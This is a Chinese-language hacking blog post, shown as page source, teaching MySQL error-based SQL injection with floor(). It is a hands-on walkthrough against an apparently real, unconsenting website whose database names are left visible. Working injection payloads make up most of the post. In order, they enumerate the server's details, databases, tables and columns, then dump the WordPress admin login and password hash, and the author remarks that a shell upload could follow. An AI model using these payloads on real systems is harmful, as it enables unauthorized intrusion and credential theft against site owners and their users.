@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sqlinjection," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Evil-404" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="1,实例显错型 mysql 注入点,如下:1http://www.vuln.com/profile_view.php?id=13  2,尝试单引号后,目标如期报错,很好,我们要的正是这个报错信息,因为后面的查询全都要靠它,另外,从报错信息来看,我们知道目标是linux的机器,网站的物理路径也顺便送给了我们,如果root的注入点,我们岂不是,嘿嘿……1http://www.vuln.com/prof">
+<meta name="keywords" content="sqlinjection">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入入门 之 mysql 显错注入 [ floor()显错 ]">
+<meta property="og:url" content="https://evil-404.github.io/2016-05-13-mysql-error-injection.html">
+<meta property="og:site_name" content="Evil-404">
+<meta property="og:description" content="1,实例显错型 mysql 注入点,如下:1http://www.vuln.com/profile_view.php?id=13  2,尝试单引号后,目标如期报错,很好,我们要的正是这个报错信息,因为后面的查询全都要靠它,另外,从报错信息来看,我们知道目标是linux的机器,网站的物理路径也顺便送给了我们,如果root的注入点,我们岂不是,嘿嘿……1http://www.vuln.com/prof">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error1.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error2.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error2_1.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error3.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error4.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error5.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error6.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error7.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error8.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error9.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error10.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error11.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error12.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error13.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error14.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error15.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error16.png">
+<meta property="og:image" content="https://evil-404.github.io/img/mysql_error17.png">
+<meta property="og:updated_time" content="2017-06-24T15:56:04.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入入门 之 mysql 显错注入 [ floor()显错 ]">
+<meta name="twitter:description" content="1,实例显错型 mysql 注入点,如下:1http://www.vuln.com/profile_view.php?id=13  2,尝试单引号后,目标如期报错,很好,我们要的正是这个报错信息,因为后面的查询全都要靠它,另外,从报错信息来看,我们知道目标是linux的机器,网站的物理路径也顺便送给了我们,如果root的注入点,我们岂不是,嘿嘿……1http://www.vuln.com/prof">
+<meta name="twitter:image" content="https://evil-404.github.io/img/mysql_error1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'LPBE9XRFRL',
+      apiKey: '246a90c6ff16be5d5708e201cf6d7158',
+      indexName: 'evil-404',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键字搜索","hits_empty":"“没有找到与 ${query} 相关的内容”","hits_stats":"“搜索到 ${hits} 条相关记录，共耗时 ${time} ms”"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://evil-404.github.io/2016-05-13-mysql-error-injection.html"/>
+
+
+
+
+
+  <title>sql注入入门 之 mysql 显错注入 [ floor()显错 ] | Evil-404</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Evil-404</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">专注于 APT 攻防研究,致力于高质量实用干货分享</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/2016-05-13-mysql-error-injection.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Evil-404">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Evil-404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sql注入入门 之 mysql 显错注入 [ floor()显错 ]</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-13T21:23:32+08:00">
+                2016-05-13
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-06-24T23:56:04+08:00">
+                2017-06-24
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/all-sql-injection/" itemprop="url" rel="index">
+                    <span itemprop="name">all sql injection</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,966
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><br><br>1,实例显错型 mysql 注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error1.png" alt="&#39;&#39;"><br></p>
+<p>2,尝试单引号后,目标如期报错,很好,我们要的正是这个报错信息,因为后面的查询全都要靠它,另外,从报错信息来看,我们知道目标是linux的机器,网站的物理路径也顺便送给了我们,如果root的注入点,我们岂不是,嘿嘿……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error2.png" alt="&#39;&#39;"><br></p>
+<p>3,同样,虽然这里打眼一看可能又会以为是个数字型注入,但其实后端依然是把它当做字符串来接收的,所以,就需要我们把前后的单引号都闭合掉<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error2_1.png" alt="&#39;&#39;"><br></p>
+<p>4,成功闭合后,就可以继续正常查询各种数据,还是习惯性的先搜集下目标数据库的相关信息<br>获取当前数据库版本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error3.png" alt="&#39;&#39;"><br></p>
+<p>获取当前数据库用户权限<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error4.png" alt="&#39;&#39;"><br></p>
+<p>查看当前数据库名,可知当前数据库名为 ‘jamesbaird_pcba’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error5.png" alt="&#39;&#39;"><br></p>
+<p>查看目标的机器名,可能有时候我们希望根据目标的机器名来大致判断当前机器是干啥的,以此来确定其价值的高低……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@hostname,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error6.png" alt="&#39;&#39;"><br></p>
+<p>查看目标mysql的安装路径,创建自定义函数时可能会用到<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@basedir,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error7.png" alt="&#39;&#39;"><br></p>
+<p>5,搜集完相关信息以后,我们开始查询真正的数据,首先,列出所有的数据库名(依然是你有权限看的’所有’),同样是利用limit<br>获取第一个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error8.png" alt="&#39;&#39;"><br></p>
+<p>获取第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error9.png" alt="&#39;&#39;"><br></p>
+<p>获取第三个数据库名,从前面我们已经知道,这个是我们当前所在的库<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error10.png" alt="&#39;&#39;"><br></p>
+<p>获取第四个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 3,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error11.png" alt="&#39;&#39;"><br></p>
+<p>6,有了所有的数据库名以后,我们就可以开始查表名了,首先,查出当前库中的所有表名,当然,我们的最终目的还是为了找到目标网站的管理表,不一定非要把所有的表名都查出来,找到管理表,只要拿到账号密码即可</p>
+<p>从当前库中获取第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error12.png" alt="&#39;&#39;"><br></p>
+<p>接着依次获取第二张表名,第三张表名,……其实,中间还查出来很多表,但并不是我想要的,所以中间的过程我就都省略了,不过,最终也还是没能找到我们想要的那张管理表,没办法,只能跨库查了,当然,跨库肯定是有前提的,你只能跨到你有权限跨进的库中,废话不多讲,我们继续查<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error13.png" alt="&#39;&#39;"><br></p>
+<p>直到当我查到’jamesbaird_current’这个库时,一眼就发现了’wp_’ 前缀,有经验的一眼就看出来了,这是个wordpress程序的数据库,既是开源程序,库表结构自然就非常清晰了(一般情况下很少人会改它原来的库表结构,因为那样可能意味着要大篇幅重构代码,如果不是做深度二次开发,最多可能只会在原有的库表基础上加表加功能),下面的十六进制数据表示的是’jamesbaird_current’库名,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=0x6a616d657362616972645f63757272656e74 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error14.png" alt="&#39;&#39;"><br></p>
+<p>7,按说,我们现在就可以直接去查出管理员的账号密码,因为wordpress默认的管理表名和该表中的字段名我们早已了如指掌,为了文章完整性,这里还是一步步的来吧<br>获取第二个字段名,用户名字段,下面的十六进制数据表示的是’wp_users’的表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error15.png" alt="&#39;&#39;"><br></p>
+<p>获取第三个字段名,密码字段<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error16.png" alt="&#39;&#39;"><br></p>
+<p>8,现在,直接从wp_users表中获取管理员的账号和密码hash即可,至此,一次基本的mysql显错注入就算完成了,虽然我们现在查到的账号密码可能并不是这个网站的后台管理账号密码,但起码我们知道它肯定有一个wordpress程序存在,找到那个wordpress所在的地址,然后登进去,传shell也是一样的,可那并不是今天的重点,这里我也不啰嗦了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user_login,0x3a,user_pass,0x23) FROM jamesbaird_current.wp_users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and  '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error17.png" alt="&#39;&#39;"><br></p>
+<p>9,最终,我们得到的管理员的账号密码如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">admin:</span><span class="number">5</span>ce14b22a4406974b33dfcaa****** (md5的hash,相必这个wordpress版本必然很低)</span><br></pre></td></tr></table></figure></p>
+<p><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这里也只是简单演示了在显错注入中最常用的一种,基于floor()函数的,关于另外两个函数的利用和这个方式都基本一致,语句稍微变下即可,这里就不再重复啰嗦了,另外,今天的重点只是想让大家明白怎么通过显错进行注入,注入语句可能一眼看上去比较难懂,但从里往外一句句拆出来执行就知道什么意思了,其实不难,关键是自己一定要有耐心<br><br></p>
+
+      
+    </div>
+    
+    
+    
+
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Evil-404
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://evil-404.github.io/2016-05-13-mysql-error-injection.html" title="sql注入入门 之 mysql 显错注入 [ floor()显错 ]">https://evil-404.github.io/2016-05-13-mysql-error-injection.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sqlinjection/" rel="tag"><i class="fa fa-tag"></i>sqlinjection</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016-05-12-mysql-common-injection.html" rel="next" title="sql注入入门 之 mysql 常规注入 [ union方式 ]">
+                <i class="fa fa-chevron-left"></i> sql注入入门 之 mysql 常规注入 [ union方式 ]
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016-05-14-mysql-bool-blind-injection.html" rel="prev" title="sql注入入门 之 mysql 布尔型盲注">
+                sql注入入门 之 mysql 布尔型盲注 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg"
+                alt="Evil-404" />
+            
+              <p class="site-author-name" itemprop="name">Evil-404</p>
+              <p class="site-description motion-element" itemprop="description">别惹我,我疯起来连自己都黑！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">156</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">111</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">107</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Hack-with-Github/Awesome-Hacking" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="evil-404@protonmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/HackwithGithub" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                安全资讯
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.freebuf.com" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.secfree.com" title="指尖安全" target="_blank">指尖安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xz.aliyun.com" title="先知社区" target="_blank">先知社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
